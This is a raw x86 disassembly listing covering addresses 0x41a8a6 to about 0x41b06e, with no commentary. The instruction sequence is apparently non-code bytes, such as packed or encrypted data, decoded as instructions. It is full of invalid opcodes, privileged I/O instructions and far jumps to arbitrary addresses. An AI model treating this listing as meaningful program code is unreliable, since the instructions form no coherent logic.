  41a8a6:	jg     0x41a902
  41a8a8:	sub    BYTE PTR [ecx],dl
  41a8aa:	mov    edi,0x8cd3cd8c
  41a8af:	scas   eax,DWORD PTR es:[edi]
  41a8b0:	mov    dh,0xe9
  41a8b2:	mov    ch,al
  41a8b4:	in     eax,dx
  41a8b5:	repnz fnstenv [ebx+0x1]
  41a8b9:	stos   DWORD PTR es:[edi],eax
  41a8ba:	into   
  41a8bb:	mov    esp,DWORD PTR [eax-0x3ae697cf]
  41a8c1:	shl    BYTE PTR [edx+0x3ac4ba3d],0xb7
  41a8c8:	and    eax,0x4be4ca9c
  41a8cd:	retf   
  41a8ce:	xor    eax,0x2adb2cd8
  41a8d3:	sub    eax,0xe3c23777
  41a8d8:	jne    0x41a91f
  41a8da:	push   ds
  41a8db:	mov    dl,0x60
  41a8dd:	adc    eax,0x365d35f1
  41a8e2:	arpl   WORD PTR [eax+0x41fe9f74],di
  41a8e8:	mov    dl,0x1d
  41a8ea:	mov    edi,0xecd0aefb
  41a8ef:	test   ecx,ebx
  41a8f1:	retf   
  41a8f2:	mov    DWORD PTR [eax],esp
  41a8f4:	mov    esp,0x98de8cc3
  41a8f9:	ficomp DWORD PTR [ebp+0x60af47c2]
  41a8ff:	push   ebp
  41a900:	imul   ebp,DWORD PTR [edi-0x431efa1e],0xffffffc8
  41a907:	push   ecx
  41a908:	mov    al,0xa1
  41a90a:	mov    edi,0xad40988a
  41a90f:	into   
  41a910:	jmp    WORD PTR [edi+ebx*4]
  41a914:	leave  
  41a915:	mov    ebx,0xeb15e0c7
  41a91a:	jae    0x41a8f8
  41a91c:	or     eax,0xe5e48f73
  41a921:	repnz adc DWORD PTR [edx-0x6dae3735],esi
  41a928:	(bad)  
  41a92a:	call   0xdd75:0x8d622ddf
  41a931:	adc    ebx,DWORD PTR [edi-0x1651e268]
  41a937:	lea    eax,[esi+0x497395f3]
  41a93d:	jg     0x41a983
  41a93f:	mov    bl,0x81
  41a941:	shr    DWORD PTR [esi-0x369c4a09],cl
  41a947:	cmp    BYTE PTR [ebx-0x3e],ch
  41a94a:	fs in  eax,dx
  41a94c:	(bad)  
  41a94d:	leave  
  41a94e:	js     0x41a934
  41a950:	bnd je 0x41a9c2
  41a953:	push   edi
  41a954:	adc    BYTE PTR [ecx-0xc9b520f],dh
  41a95a:	mov    ebp,DWORD PTR [ebp+0x44]
  41a95d:	imul   ebx,DWORD PTR [eax-0x114aaea7],0x22e9bd77
  41a967:	(bad)  
  41a968:	icebp  
  41a969:	pop    ss
  41a96a:	sti    
  41a96b:	cli    
  41a96c:	mov    bh,0xb2
  41a96e:	das    
  41a96f:	sti    
  41a970:	add    al,0xe1
  41a972:	sti    
  41a973:	les    ecx,FWORD PTR [esi+edi*4]
  41a976:	sbb    BYTE PTR [eax],dl
  41a978:	mov    bl,0x68
  41a97a:	(bad)  
  41a97b:	out    dx,eax
  41a97c:	rol    BYTE PTR [esi+0x5de101b3],cl
  41a982:	or     BYTE PTR [edx-0x29],ah
  41a985:	(bad)
  41a989:	jp     0x41a974
  41a98b:	pop    edx
  41a98c:	adc    dl,BYTE PTR [esi]
  41a98e:	repz add al,0x1e
  41a991:	arpl   WORD PTR [ebx],bp
  41a993:	sahf   
  41a994:	daa    
  41a995:	ret    
  41a996:	mov    BYTE PTR [ebp+0x44128b98],al
  41a99c:	mov    ecx,0x9e063bd6
  41a9a1:	es repnz xchg esp,eax
  41a9a4:	(bad)  
  41a9a5:	cmp    BYTE PTR [edx+0x4cf80756],al
  41a9ab:	add    eax,0xee7318e4
  41a9b0:	scas   al,BYTE PTR es:[edi]
  41a9b1:	and    al,0x42
  41a9b3:	cmp    DWORD PTR [edx+0x58],ebp
  41a9b6:	jmp    0x2aaa:0x70825dbc
  41a9bd:	jnp    0x41a9da
  41a9bf:	jp     0x41a9c0
  41a9c1:	or     edi,DWORD PTR [eax]
  41a9c3:	push   edi
  41a9c4:	stos   BYTE PTR es:[edi],al
  41a9c5:	scas   eax,DWORD PTR es:[edi]
  41a9c6:	inc    ebx
  41a9c7:	jmp    0x22b1:0x3070c939
  41a9ce:	sbb    cl,BYTE PTR [esi]
  41a9d0:	jge    0x41a9b9
  41a9d2:	sub    BYTE PTR [ebp+esi*1-0x31f3c562],dh
  41a9d9:	ret    0x2959
  41a9dc:	stos   DWORD PTR es:[edi],eax
  41a9dd:	ja     0x41aa0d
  41a9df:	iret   
  41a9e0:	mov    bl,0xaa
  41a9e2:	in     al,0xe3
  41a9e4:	fidiv  WORD PTR [ebp-0x24ca6341]
  41a9ea:	and    ah,BYTE PTR [edx+eiz*4+0x51]
  41a9ee:	inc    eax
  41a9ef:	bound  ecx,QWORD PTR [eax+0x2617d740]
  41a9f5:	sub    DWORD PTR [ecx],eax
  41a9f7:	(bad)  
  41a9f8:	ins    DWORD PTR es:[edi],dx
  41a9f9:	adc    BYTE PTR [esi-0x53f6d8a2],bl
  41a9ff:	fs mov eax,0x42f90279
  41aa05:	inc    edx
  41aa07:	popa   
  41aa08:	aaa    
  41aa09:	ret    
  41aa0a:	fst    DWORD PTR [edx-0x6abd83d3]
  41aa10:	inc    ebp
  41aa11:	jmp    0x41aa81
  41aa13:	xor    al,0x87
  41aa15:	xlat   BYTE PTR ds:[ebx]
  41aa16:	xchg   edx,eax
  41aa17:	jnp    0x41aa0e
  41aa19:	rcl    WORD PTR [edi-0x28],1
  41aa1d:	inc    ecx
  41aa1e:	mov    esp,0x9ea17d78
  41aa23:	mov    eax,0x76ccb742
  41aa28:	add    eax,0x62
  41aa2b:	jb     0x41aa0f
  41aa2d:	call   0x90682aa9
  41aa32:	pop    edx
  41aa33:	fsubr  DWORD PTR [ebx+0x5724a9fb]
  41aa39:	int    0x33
  41aa3b:	ja     0x41aa47
  41aa3d:	lds    ebp,FWORD PTR [edi+0x5952b09a]
  41aa43:	into   
  41aa44:	add    DWORD PTR [edi],ecx
  41aa46:	jp     0x41aab5
  41aa48:	(bad)
  41aa4b:	out    dx,eax
  41aa4c:	stc    
  41aa4d:	int3   
  41aa4e:	mov    ebp,0x613491d7
  41aa53:	adc    ebp,DWORD PTR [edx+eiz*1-0xa]
  41aa57:	jb     0x41aa09
  41aa59:	pop    ds
  41aa5a:	jp     0x41aab6
  41aa5c:	sbb    esi,ecx
  41aa5e:	clc    
  41aa5f:	loop   0x41aaa4
  41aa61:	mov    esp,0xba5c6644
  41aa66:	sahf   
  41aa67:	xchg   ch,bl
  41aa69:	js     0x41aa99
  41aa6b:	sbb    BYTE PTR [edx+0x6c],al
  41aa6e:	push   ds
  41aa6f:	les    edx,FWORD PTR [esp+ecx*2-0x15964ab5]
  41aa76:	jp     0x41aa8c
  41aa78:	add    eax,0x7697d214
  41aa7d:	mov    ebx,0x8a5228a4
  41aa82:	push   edi
  41aa83:	loop   0x41aa69
  41aa85:	lea    esp,[esi+0x26]
  41aa88:	sbb    ecx,esi
  41aa8a:	daa    
  41aa8b:	leave  
  41aa8c:	jmp    0x47131425
  41aa91:	add    eax,0xce6fdce2
  41aa96:	jmp    0x38f73201
  41aa9b:	push   ebp
  41aa9c:	and    DWORD PTR [ebx],0x1d05fc21
  41aaa2:	push   0xffffffae
  41aaa4:	jno    0x41aa7b
  41aaa6:	stos   BYTE PTR es:[edi],al
  41aaa7:	rcl    DWORD PTR [eax+0x5adf3bdf],cl
  41aaad:	arpl   WORD PTR [ebp+0x18],si
  41aab0:	mov    eax,0x9431a876
  41aab5:	lds    edx,FWORD PTR [esi-0x1a]
  41aab8:	scas   eax,DWORD PTR es:[edi]
  41aab9:	imul   edx
  41aabb:	cdq    
  41aabc:	pop    ecx
  41aabd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aabe:	xchg   esi,eax
  41aabf:	loopne 0x41ab33
  41aac1:	jae    0x41aad6
  41aac3:	or     ecx,DWORD PTR [eax]
  41aac5:	xchg   ecx,eax
  41aac6:	loop   0x41aa5a
  41aac8:	inc    edx
  41aac9:	xchg   edx,eax
  41aaca:	into   
  41aacb:	cmp    ecx,DWORD PTR [ebx+0x6e411097]
  41aad1:	push   esp
  41aad2:	scas   eax,DWORD PTR es:[edi]
  41aad3:	mov    ebx,0xaf76327c
  41aad8:	mov    ebp,0x881af9fa
  41aadd:	push   esi
  41aade:	stc    
  41aadf:	cmp    eax,0x9400708
  41aae4:	xlat   BYTE PTR ds:[ebx]
  41aae5:	dec    ebx
  41aae6:	retf   0x9e2d
  41aae9:	xchg   esi,eax
  41aaea:	and    ah,ch
  41aaec:	(bad)  
  41aaed:	push   ss
  41aaee:	fdivp  st(3),st
  41aaf0:	mov    dl,0x36
  41aaf2:	fscale 
  41aaf4:	pop    eax
  41aaf5:	mov    ah,0xad
  41aaf7:	mov    cl,0xea
  41aaf9:	icebp  
  41aafa:	dec    esp
  41aafb:	loop   0x41aa9b
  41aafd:	and    esi,DWORD PTR [ebx-0x6a7b91bf]
  41ab03:	jno    0x41ab09
  41ab05:	mov    cl,0xe6
  41ab07:	sbb    ecx,DWORD PTR [edi]
  41ab09:	xor    DWORD PTR [eax-0x6a56506d],edx
  41ab0f:	jp     0x41aa94
  41ab11:	pop    edi
  41ab12:	scas   eax,DWORD PTR es:[edi]
  41ab13:	or     esp,edx
  41ab15:	and    cl,BYTE PTR [eax]
  41ab17:	xchg   al,cl
  41ab19:	test   bh,cl
  41ab1b:	sub    al,0xac
  41ab1d:	les    ecx,FWORD PTR [edi]
  41ab1f:	test   BYTE PTR [ecx-0x11],dh
  41ab22:	(bad)  [eax]
  41ab24:	or     al,BYTE PTR [edx-0x3a]
  41ab27:	shl    DWORD PTR [ebx],1
  41ab29:	aaa    
  41ab2a:	mov    BYTE PTR ds:0x9fa1fa6c,cl
  41ab30:	test   DWORD PTR [edx],0xa74e8bdb
  41ab36:	mov    bh,0xa4
  41ab38:	pop    eax
  41ab39:	shr    edx,0x32
  41ab3c:	lock ret 0xd3cf
  41ab40:	xchg   ebx,eax
  41ab41:	jmp    0x9f532044
  41ab46:	out    dx,al
  41ab47:	sbb    cl,ch
  41ab49:	xchg   DWORD PTR [ecx+0x78edcf27],esp
  41ab4f:	or     al,0x63
  41ab51:	and    ebx,DWORD PTR [ebp+0x331ee80f]
  41ab57:	cmovae ebx,DWORD PTR [esi+eiz*8+0x1f]
  41ab5c:	ja     0x41ab11
  41ab5e:	jne    0x41abb7
  41ab60:	xchg   BYTE PTR [ecx-0x9],ah
  41ab63:	dec    ebx
  41ab64:	(bad)  
  41ab66:	movsx  edx,dx
  41ab69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab6a:	jb     0x41aafc
  41ab6c:	(bad)  
  41ab6d:	js     0x41ab17
  41ab6f:	fucom  st(5)
  41ab71:	fwait
  41ab72:	inc    esp
  41ab73:	imul   ebx,DWORD PTR [eax],0xd8457ddc
  41ab79:	dec    edx
  41ab7b:	test   esi,0x3ae392a
  41ab81:	sbb    eax,0xf76110ec
  41ab86:	repnz sub esi,eax
  41ab89:	push   es
  41ab8a:	and    edi,ebp
  41ab8c:	cmp    al,0xe5
  41ab8e:	scas   al,BYTE PTR es:[edi]
  41ab8f:	sub    ecx,DWORD PTR [ebp-0x3c]
  41ab92:	call   0xcc80620
  41ab97:	outs   dx,BYTE PTR ds:[esi]
  41ab98:	xor    cl,BYTE PTR [ebx+0x4805097c]
  41ab9e:	into   
  41ab9f:	add    al,0xa9
  41aba1:	fsub   QWORD PTR [edi]
  41aba3:	imul   eax,eax,0xcb125e29
  41aba9:	pop    es
  41abaa:	je     0x41abde
  41abac:	fwait
  41abad:	in     al,0x6a
  41abaf:	jnp    0x41abc8
  41abb1:	out    dx,eax
  41abb2:	leave  
  41abb3:	push   ds
  41abb4:	shl    DWORD PTR [ebx-0x8],1
  41abb7:	(bad)  
  41abb8:	outs   dx,DWORD PTR ds:[esi]
  41abb9:	lock loop 0x41abe1
  41abbc:	push   0xfffffffe
  41abbe:	repnz push ebp
  41abc0:	pfmax  mm1,QWORD PTR [edi-0x4bc4fa06]
  41abc8:	ret    0x8459
  41abcb:	pop    ss
  41abcc:	leave  
  41abcd:	xor    ah,cl
  41abcf:	pop    ebx
  41abd0:	inc    edi
  41abd1:	mov    dl,0xde
  41abd3:	outs   dx,BYTE PTR ds:[esi]
  41abd4:	push   edx
  41abd5:	stc    
  41abd6:	call   0x68a6:0x5288293b
  41abdd:	mov    ah,ah
  41abdf:	imul   edi,DWORD PTR [ebp+0x5e],0xa33d83df
  41abe6:	or     ah,BYTE PTR [ebx-0x4c]
  41abe9:	cdq    
  41abea:	iret   
  41abeb:	jo     0x41ac19
  41abed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abee:	adc    eax,0xcaf1aa7
  41abf3:	push   ds
  41abf4:	lds    ebp,FWORD PTR [ebp-0x4c89bc1a]
  41abfa:	sbb    esi,DWORD PTR [ebx-0x67b577c0]
  41ac00:	sub    eax,ebp
  41ac02:	jmp    0x41ac25
  41ac04:	push   ecx
  41ac05:	mov    ds:0xf194b139,eax
  41ac0a:	outs   dx,BYTE PTR ds:[esi]
  41ac0b:	test   eax,0xe72af7de
  41ac10:	xchg   BYTE PTR [esi-0x74],dl
  41ac13:	cmp    BYTE PTR [esi+ebp*8],0x9f
  41ac17:	xchg   esp,eax
  41ac18:	call   0xb034c1
  41ac1d:	and    ebx,edx
  41ac1f:	mov    cl,0x3c
  41ac21:	mov    edi,0xa1149e83
  41ac26:	push   0x1b
  41ac28:	push   esp
  41ac29:	sub    eax,0x45c9d7cd
  41ac2e:	push   0x2d
  41ac30:	mov    edi,0x8a82bffc
  41ac35:	in     al,0x29
  41ac37:	mov    dh,0x4b
  41ac39:	ret    0xad45
  41ac3c:	inc    eax
  41ac3d:	dec    ebx
  41ac3e:	push   ebp
  41ac3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac40:	jp     0x41aca9
  41ac42:	mov    edx,0x22e1dd09
  41ac47:	push   ecx
  41ac48:	cmp    al,0xb3
  41ac4a:	add    eax,0x99982d5f
  41ac4f:	adc    ah,cl
  41ac51:	xor    ebx,DWORD PTR [edi+0x69515286]
  41ac57:	mov    al,0xa9
  41ac59:	xor    al,0xae
  41ac5b:	or     eax,0xfae60877
  41ac60:	repz aaa 
  41ac62:	jnp    0x41abe9
  41ac64:	std    
  41ac65:	aas    
  41ac66:	push   ebx
  41ac67:	mov    ecx,0xb9164895
  41ac6c:	mov    bh,0xd
  41ac6e:	lods   eax,DWORD PTR ds:[esi]
  41ac6f:	push   ecx
  41ac70:	retf   0xd4dc
  41ac73:	int3   
  41ac74:	lock loop 0x41accd
  41ac77:	cli    
  41ac78:	or     dl,dl
  41ac7a:	stos   DWORD PTR es:[edi],eax
  41ac7b:	cs cmp eax,0x5a23aac3
  41ac81:	scas   al,BYTE PTR es:[edi]
  41ac82:	add    DWORD PTR [ebp+0x8fc2205],esp
  41ac88:	imul   edi,esp,0xffffffcd
  41ac8b:	add    ebx,DWORD PTR [edi-0x392a4a9d]
  41ac91:	mov    esi,0x26e58824
  41ac96:	pop    ebp
  41ac97:	call   0x576:0x442788fb
  41ac9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac9f:	xchg   DWORD PTR [eax-0x2017f105],esp
  41aca5:	push   ds
  41aca6:	gs cmp eax,0x28d87684
  41acac:	pop    esi
  41acad:	(bad)  
  41acaf:	push   cs
  41acb0:	(bad)  
  41acb1:	mul    ebx
  41acb3:	sub    bh,BYTE PTR [edi]
  41acb5:	push   ss
  41acb6:	ins    DWORD PTR es:[edi],dx
  41acb7:	retf   
  41acb8:	adc    al,0x47
  41acba:	fadd   DWORD PTR ds:0xa3544439
  41acc0:	push   0x34
  41acc2:	mov    eax,0x2752a99f
  41acc7:	add    eax,DWORD PTR [eax-0x28]
  41acca:	aad    0xf6
  41accc:	push   ss
  41accd:	mov    al,BYTE PTR [edx+ebp*4]
  41acd0:	int3   
  41acd1:	and    dl,dl
  41acd3:	mov    ecx,0x242ea061
  41acd8:	xor    cl,BYTE PTR [ecx+0x63ad265d]
  41acde:	mov    edx,0xe47e8650
  41ace3:	add    al,0x65
  41ace5:	in     eax,0x22
  41ace7:	sub    BYTE PTR [edi],dl
  41ace9:	and    al,BYTE PTR [esi-0x4eff33c]
  41acef:	push   0x51
  41acf1:	repnz xchg edx,eax
  41acf3:	pop    edi
  41acf4:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41acf6:	aas    
  41acf7:	sbb    eax,0xf0da0d62
  41acfc:	sub    eax,0xfa44ae51
  41ad01:	ss iret 
  41ad03:	dec    edx
  41ad04:	rol    ah,cl
  41ad06:	ficomp WORD PTR ds:0x54db27d3
  41ad0c:	jae    0x41acec
  41ad0e:	call   0xe51c:0x9201b4c3
  41ad15:	shl    BYTE PTR [eax],cl
  41ad17:	loope  0x41ad2a
  41ad19:	mov    BYTE PTR [ecx+0x52],bl
  41ad1c:	out    dx,al
  41ad1d:	maskmovq mm0,(bad)
  41ad1e:	test   DWORD PTR ds:0x12707c6e,0xe8557b88
  41ad28:	pop    esi
  41ad29:	call   0x9a57:0x5435bc91
  41ad30:	mov    edi,0x192d50c0
  41ad35:	xlat   BYTE PTR ds:[ebx]
  41ad36:	jo     0x41ad92
  41ad38:	jnp    0x41ad85
  41ad3a:	xor    esi,DWORD PTR [eax+eax*2+0x33]
  41ad3e:	ror    DWORD PTR [ebp+0x27cbd4a8],cl
  41ad44:	shr    dl,1
  41ad46:	jge    0x41acf6
  41ad48:	je     0x41ad58
  41ad4a:	imul   esi,DWORD PTR [edx+0x7d],0xffffff86
  41ad4e:	mov    dh,0x50
  41ad50:	jmp    0x7f78:0x34f34380
  41ad57:	into   
  41ad58:	lods   eax,DWORD PTR ds:[esi]
  41ad59:	jne    0x41ad82
  41ad5b:	shl    BYTE PTR [esi-0x7c],0x16
  41ad5f:	and    ebp,esi
  41ad61:	jecxz  0x41add0
  41ad63:	jne    0x41ad93
  41ad65:	lods   eax,DWORD PTR ds:[esi]
  41ad66:	mov    bh,0x49
  41ad68:	data16 daa 
  41ad6a:	int3   
  41ad6b:	ret    
  41ad6c:	retf   0x504a
  41ad6f:	daa    
  41ad70:	inc    eax
  41ad71:	pushf  
  41ad72:	retf   
  41ad73:	shl    DWORD PTR [ecx],cl
  41ad75:	mov    cl,0x62
  41ad77:	out    dx,eax
  41ad78:	pop    ebx
  41ad79:	imul   esp,DWORD PTR [ebx+0x15],0xffffffe5
  41ad7d:	test   BYTE PTR [edi+0x11],0x75
  41ad81:	fist   WORD PTR [ebx+0x72]
  41ad84:	mov    cl,BYTE PTR [ecx+eax*1+0x32]
  41ad88:	hlt    
  41ad89:	or     ebx,DWORD PTR [eax+0x58dee4b9]
  41ad8f:	scas   eax,DWORD PTR es:[edi]
  41ad90:	jae    0x41ad90
  41ad92:	dec    esi
  41ad93:	and    BYTE PTR [ebp-0x345ea1b8],dl
  41ad99:	jmp    0x2eb42a5c
  41ad9e:	jle    0x41ad22
  41ada0:	es pop ecx
  41ada2:	xchg   esp,eax
  41ada3:	je     0x41ae0a
  41ada5:	mov    al,0xba
  41ada7:	pusha  
  41ada8:	push   es
  41ada9:	push   es
  41adaa:	ds jge 0x41aded
  41adad:	out    0xed,al
  41adaf:	scas   al,BYTE PTR es:[edi]
  41adb0:	sbb    ebx,DWORD PTR [ecx-0xc]
  41adb3:	sub    al,0x8b
  41adb5:	jp     0x41ad75
  41adb7:	or     BYTE PTR [eax-0x2a],0x1b
  41adbb:	jmp    0x7b96a649
  41adc0:	lods   al,BYTE PTR ds:[esi]
  41adc1:	mov    WORD PTR [ebx],es
  41adc3:	mov    al,0x5c
  41adc5:	enter  0x904a,0xc7
  41adc9:	adc    dh,BYTE PTR [esi-0x1b3ea1b]
  41adcf:	or     BYTE PTR [edi-0x127d9ed4],dh
  41add5:	xor    ch,0x1d
  41add8:	outs   dx,DWORD PTR ds:[esi]
  41add9:	test   al,0x2c
  41addb:	ret    0x5642
  41adde:	xchg   ebx,eax
  41addf:	shl    DWORD PTR es:[ebx-0x4ef89e17],cl
  41ade6:	inc    esi
  41ade7:	pusha  
  41ade8:	inc    edx
  41ade9:	sub    ch,ah
  41adeb:	fadd   DWORD PTR [esi+0x19]
  41adee:	push   ecx
  41adef:	cld    
  41adf0:	mov    ds:0x31c421ae,al
  41adf5:	pop    ecx
  41adf6:	jbe    0x41adce
  41adf8:	push   edx
  41adf9:	or     eax,0x802eafa9
  41adfe:	fmul   st(5),st
  41ae00:	add    al,BYTE PTR [ebx-0x6d6697cd]
  41ae06:	mov    DWORD PTR gs:[edx-0x62],esp
  41ae0a:	push   eax
  41ae0b:	cmp    ecx,esi
  41ae0d:	inc    esi
  41ae0e:	xchg   ecx,eax
  41ae0f:	cmp    ch,BYTE PTR [ecx+eiz*2+0x78]
  41ae13:	sbb    al,0x2b
  41ae15:	inc    edx
  41ae16:	outs   dx,DWORD PTR ds:[esi]
  41ae17:	mov    ch,BYTE PTR [eax]
  41ae19:	sbb    ebp,edx
  41ae1b:	stos   DWORD PTR es:[edi],eax
  41ae1c:	inc    esi
  41ae1d:	jge    0x41ae88
  41ae1f:	je     0x41adcf
  41ae21:	sub    ebx,ecx
  41ae23:	mov    dh,0x9a
  41ae25:	sbb    eax,0x7cdd2a77
  41ae2a:	scas   al,BYTE PTR es:[edi]
  41ae2b:	adc    BYTE PTR [esi],cl
  41ae2d:	cld    
  41ae2e:	(bad)
  41ae32:	outs   dx,BYTE PTR ds:[esi]
  41ae33:	pop    DWORD PTR [edi]
  41ae35:	xchg   ebp,eax
  41ae36:	in     al,dx
  41ae37:	sahf   
  41ae38:	mov    ecx,0x24a6170d
  41ae3d:	lods   al,BYTE PTR ds:[esi]
  41ae3e:	ret    0xf307
  41ae41:	pop    eax
  41ae42:	push   0xffffffa4
  41ae44:	mov    al,ds:0xa4452c70
  41ae49:	ss repnz adc esp,ecx
  41ae4d:	std    
  41ae4e:	add    eax,DWORD PTR [ebp+eiz*4-0x6e]
  41ae52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae53:	mov    WORD PTR [ebp-0x6a1a322f],?
  41ae59:	data16 xor ch,BYTE PTR [esi+0x5189cca6]
  41ae60:	xchg   esp,eax
  41ae61:	lock jmp 0xc013:0x993e1774
  41ae69:	sub    DWORD PTR [ecx+0x7be574ee],ecx
  41ae6f:	inc    esi
  41ae70:	xchg   esi,eax
  41ae71:	iret   
  41ae72:	mov    ds:0x42775808,eax
  41ae77:	ins    BYTE PTR es:[edi],dx
  41ae78:	fld    QWORD PTR [esi]
  41ae7a:	das    
  41ae7b:	cwde   
  41ae7c:	mov    edi,0x1ce15d62
  41ae81:	mov    edi,0xb0042f1
  41ae86:	mov    edx,0x3539a269
  41ae8b:	add    BYTE PTR [edi+0x65a65f6e],al
  41ae91:	fwait
  41ae92:	int3   
  41ae93:	or     ebp,DWORD PTR ds:[eax-0x6c88a112]
  41ae9a:	push   edx
  41ae9b:	pop    ecx
  41ae9c:	lock xor ecx,DWORD PTR [ebx-0x20]
  41aea0:	inc    ebp
  41aea1:	inc    edi
  41aea2:	stos   BYTE PTR es:[edi],al
  41aea3:	mov    ebx,0xf050b07a
  41aea8:	add    DWORD PTR [esi+0x1c],esp
  41aeab:	(bad)  
  41aeac:	in     eax,0x37
  41aeae:	xchg   esp,eax
  41aeaf:	stos   BYTE PTR es:[edi],al
  41aeb0:	mov    bl,0x4d
  41aeb2:	mov    ecx,0x87d798f0
  41aeb7:	xchg   edi,eax
  41aeb8:	sub    edi,edi
  41aeba:	push   cs
  41aebb:	cmp    DWORD PTR [ebx+eax*4-0x7768b3ba],esi
  41aec2:	fbstp  TBYTE PTR [esi+0x4258f959]
  41aec8:	sub    al,0xe2
  41aeca:	jbe    0x41aeda
  41aecc:	nop
  41aecd:	aas    
  41aece:	test   eax,0xd336cc83
  41aed3:	sbb    al,BYTE PTR [edi+0x1d52d44d]
  41aed9:	mov    al,0x3c
  41aedb:	popf   
  41aedc:	fs mov dl,0x15
  41aedf:	call   0x79ea4b82
  41aee4:	jae    0x41af57
  41aee6:	(bad)  
  41aee7:	std    
  41aee8:	jns    0x41af41
  41aeea:	push   eax
  41aeeb:	jns    0x41af1d
  41aeed:	cli    
  41aeee:	or     al,0x38
  41aef0:	data16 mov ch,0xb6
  41aef3:	lods   eax,DWORD PTR ds:[esi]
  41aef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aef5:	sub    BYTE PTR [edx+ebp*8],ah
  41aef8:	into   
  41aef9:	jle    0x41af12
  41aefb:	repz adc BYTE PTR [esi+0x42b45b46],dh
  41af02:	fsubrp st(4),st
  41af04:	add    dh,BYTE PTR [ebx-0x58b5ddb7]
  41af0a:	sbb    eax,0xd2158aa8
  41af0f:	call   0x1349:0x3c993d24
  41af16:	add    eax,0xea065161
  41af1b:	inc    ebx
  41af1c:	pop    eax
  41af1d:	call   0x758f:0x91e2a038
  41af24:	cs mov edi,0x3647aaf7
  41af2a:	or     eax,0x72eb6228
  41af2f:	jbe    0x41af77
  41af31:	adc    DWORD PTR [eax+0x8],ebx
  41af34:	lock ins DWORD PTR es:[edi],dx
  41af36:	jmp    0x3723:0xb3701e87
  41af3d:	in     eax,0x2f
  41af3f:	and    cl,BYTE PTR [edi-0x21]
  41af42:	sub    al,0xee
  41af44:	fsub   DWORD PTR [ecx+edx*2]
  41af47:	pop    es
  41af48:	gs inc ebp
  41af4a:	push   esp
  41af4b:	pop    esp
  41af4c:	pop    ebx
  41af4d:	xchg   esp,eax
  41af4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af4f:	xchg   ecx,eax
  41af50:	sbb    ah,BYTE PTR [eax-0x7f8c4c18]
  41af56:	stc    
  41af57:	gs (bad) 
  41af59:	jg     0x41af0d
  41af5b:	stos   DWORD PTR es:[edi],eax
  41af5c:	sbb    al,0x68
  41af5e:	push   cs
  41af5f:	outs   dx,BYTE PTR ds:[esi]
  41af60:	add    DWORD PTR ds:0x38c3738a,0xd795eee8
  41af6a:	lods   al,BYTE PTR ds:[esi]
  41af6b:	loop   0x41af81
  41af6d:	xlat   BYTE PTR ds:[ebx]
  41af6e:	jae    0x41afbe
  41af70:	and    esi,DWORD PTR [edi]
  41af72:	mov    al,0xd3
  41af74:	add    eax,0x98b7534e
  41af79:	loope  0x41afe5
  41af7b:	into   
  41af7c:	push   edi
  41af7d:	and    eax,0x8989fab9
  41af82:	hlt    
  41af83:	jmp    0x41af8e
  41af85:	push   ecx
  41af86:	ja     0x41af9b
  41af88:	cs lock adc eax,0xef9b8f35
  41af8f:	mov    dh,0xc8
  41af91:	jmp    0x5df77f42
  41af96:	sub    eax,0x25cf0da0
  41af9b:	sar    BYTE PTR [edx],cl
  41af9d:	out    0xc,eax
  41af9f:	jne    0x41afaa
  41afa1:	(bad)  
  41afa2:	in     eax,0x7e
  41afa4:	test   BYTE PTR [edx+0x48],dl
  41afa7:	push   edi
  41afa8:	int3   
  41afa9:	hlt    
  41afaa:	(bad)  [edi]
  41afac:	in     al,0x15
  41afae:	mov    edi,0x5f889ba3
  41afb3:	jge    0x41afbd
  41afb5:	les    esi,FWORD PTR [ecx-0x59]
  41afb8:	mov    ebx,0xf130856d
  41afbd:	cmp    bh,bh
  41afbf:	dec    eax
  41afc0:	stos   BYTE PTR es:[edi],al
  41afc1:	daa    
  41afc2:	fsub   QWORD PTR [ebp+esi*4-0x254cf91b]
  41afc9:	adc    BYTE PTR [edi],al
  41afcb:	in     al,0x16
  41afcd:	ins    DWORD PTR es:[edi],dx
  41afce:	ss das 
  41afd0:	xor    DWORD PTR [ebp+0x2114572a],ebx
  41afd6:	lods   eax,DWORD PTR ds:[esi]
  41afd7:	add    eax,0x8bbd52ca
  41afdc:	pushf  
  41afdd:	(bad)
  41afe0:	je     0x41afa6
  41afe2:	mov    al,ds:0xc47ae083
  41afe7:	mov    ebp,0x34f6d6c8
  41afec:	inc    edx
  41afed:	mov    ebx,0xf03bf0eb
  41aff2:	xchg   BYTE PTR [esi-0x7f507dc7],dl
  41aff8:	sub    DWORD PTR [esi-0x4cbcd52b],ebx
  41affe:	sbb    eax,0x9646a93
  41b003:	aam    0xc4
  41b005:	fistp  WORD PTR [ebx-0x27]
  41b008:	pop    ds
  41b009:	sbb    al,0xf9
  41b00b:	out    0xc7,al
  41b00d:	call   FWORD PTR [edi-0x60]
  41b010:	out    dx,al
  41b011:	mov    ch,BYTE PTR [ebx]
  41b013:	dec    DWORD PTR [ecx-0x69]
  41b016:	push   ebp
  41b017:	repnz adc eax,0xb411ce5e
  41b01d:	sub    dh,BYTE PTR [esi]
  41b01f:	sub    eax,0x2e540
  41b024:	lea    esi,[ecx+0x2435dd57]
  41b02a:	inc    edi
  41b02b:	mov    bl,bh
  41b02d:	mov    ds:0xb8739138,eax
  41b032:	loop   0x41b070
  41b034:	rol    BYTE PTR [eax-0x77a44cf8],cl
  41b03a:	test   al,0x67
  41b03c:	addr16 inc ebx
  41b03e:	add    dl,cl
  41b040:	mov    esi,0x64cfecee
  41b045:	inc    esp
  41b046:	cwde   
  41b047:	cmp    al,0xa8
  41b049:	jecxz  0x41b079
  41b04b:	add    ah,BYTE PTR [ecx+0x20]
  41b04e:	jmp    0x41b0c3
  41b050:	cmp    BYTE PTR [ebp+ebx*1-0x3dddad17],dh
  41b057:	(bad)  [eax+0xabdee54]
  41b05d:	and    eax,0x188a0856
  41b062:	xchg   esp,eax
  41b063:	jo     0x41b082
  41b065:	(bad)  
  41b066:	and    DWORD PTR [ecx+0x29],esi
  41b069:	jb     0x41b02e
  41b06b:	jns    0x41b015
  41b06d:	inc    esi
  41b06e:	mov    eax,0xc7e21808
